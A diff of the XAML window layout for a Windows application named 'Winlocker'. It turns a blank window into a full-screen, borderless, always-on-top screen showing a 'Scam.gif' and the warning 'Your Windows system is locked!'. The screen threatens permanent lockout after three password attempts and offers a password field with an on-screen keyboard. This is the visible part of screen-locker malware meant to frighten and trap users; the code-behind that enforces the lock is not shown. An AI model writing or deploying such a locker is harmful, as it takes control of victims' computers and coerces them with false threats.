@@ -1,12 +1,108 @@
 ﻿<Window x:Class="Winlocker.MainWindow"
+        mc:Ignorable="d"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:gif="https://github.com/XamlAnimatedGif/XamlAnimatedGif"
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:Winlocker"
-        mc:Ignorable="d"
-        Title="MainWindow" Height="450" Width="800">
+        Background="#080807" Loaded="WindowLoaded"
+        WindowStyle="None" ResizeMode="NoResize"
+        WindowState="Maximized" Topmost="True"
+        Height="850" Width="800">
+
     <Grid>
-        
+        <Grid.RowDefinitions>
+            <RowDefinition Height="250"/>
+            <RowDefinition Height="150"/>
+            <RowDefinition Height="*"/>
+        </Grid.RowDefinitions>
+
+        <Image Grid.Row="0" Width="200" Height="200" gif:AnimationBehavior.SourceUri="Resources/Scam.gif" />
+
+        <Grid Grid.Row="1" HorizontalAlignment="Center">
+            <StackPanel>
+                <TextBlock Foreground="LimeGreen" FontWeight="Bold" FontSize="28" Text="Your Windows system is locked!"/>
+                <TextBlock Foreground="LimeGreen" FontWeight="SemiBold" FontSize="23" Text="* When you restart your computer, Windows will be locked"/>
+                <TextBlock Foreground="LimeGreen" FontWeight="SemiBold" FontSize="23" Text="* You have 3 attempts to enter your password"/>
+                <TextBlock Foreground="LimeGreen" FontWeight="SemiBold" FontSize="23" Text="* If you have no more attempts, the system will be locked"/>
+            </StackPanel>
+        </Grid>
+
+        <Grid Grid.Row="2" HorizontalAlignment="Center">
+            <Grid.RowDefinitions>
+                <RowDefinition Height="70"/>
+                <RowDefinition Height="60"/>
+                <RowDefinition Height="60"/>
+                <RowDefinition Height="60"/>
+                <RowDefinition Height="60"/>
+                <RowDefinition Height="60"/>
+            </Grid.RowDefinitions>
+
+            <StackPanel Grid.Row="0" Orientation="Horizontal" HorizontalAlignment="Left">
+                <TextBox MaxLength="30" HorizontalAlignment="Center" Name="PasswordBox" Style="{StaticResource MyPasswordBox}"/>
+                <Button Name="button_unlock" Content="Unlock" Click="Unlock" Style="{StaticResource MyButtonUnlock}"/>
+            </StackPanel>
+
+            <StackPanel Grid.Row="1" Orientation="Horizontal" Height="60" HorizontalAlignment="Left">
+                <Button Name="button_D1" Content="1" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D2" Content="2" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D3" Content="3" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D4" Content="4" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D5" Content="5" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D6" Content="6" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D7" Content="7" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D8" Content="8" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D9" Content="9" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D0" Content="0" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_Back" Content="Backspace" Click="OnBackspace" Style="{StaticResource MyButtonLong}"/>
+            </StackPanel>
+
+            <StackPanel Grid.Row="2" Orientation="Horizontal" Height="60" >
+                <Button Name="button_Q" Content="q" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_W" Content="w" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_E" Content="e" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_R" Content="r" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_T" Content="t" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_Y" Content="y" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_U" Content="u" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_I" Content="i" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_O" Content="o" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_P" Content="p" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_Capital" Click="OnCapsLock" Content="Caps Lock" Style="{StaticResource MyButtonLong}"/>
+            </StackPanel>
+
+            <StackPanel Grid.Row="3" Orientation="Horizontal" Height="60" >
+                <Button Name="button_A" Content="a" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_S" Content="s" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_D" Content="d" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_F" Content="f" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_G" Content="g" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_H" Content="h" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_J" Content="j" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_K" Content="k" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_L" Content="l" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_Oem1" Content=";" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_Oem2" Content="-" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_OemOpenBrackets" Content="[" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_OemCloseBrackets" Content="]" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+            </StackPanel>
+
+            <StackPanel Grid.Row="4" Orientation="Horizontal" Height="60">
+                <Button Name="button_Z" Content="z" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_X" Content="x" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_C" Content="c" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_V" Content="v" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_B" Content="b" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_N" Content="n" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name="button_M" Content="m" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_OemComma" Content="," Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_OemPeriod" Content="." Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_OemQuestion" Content="/" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_Oem5" Content="\" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_Oem3" Content="`" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+                <Button Name ="button_OemQuotes" Content="'" Click="OnClick" Style="{StaticResource MyButtonShort}"/>
+            </StackPanel>
+        </Grid>
     </Grid>
 </Window>
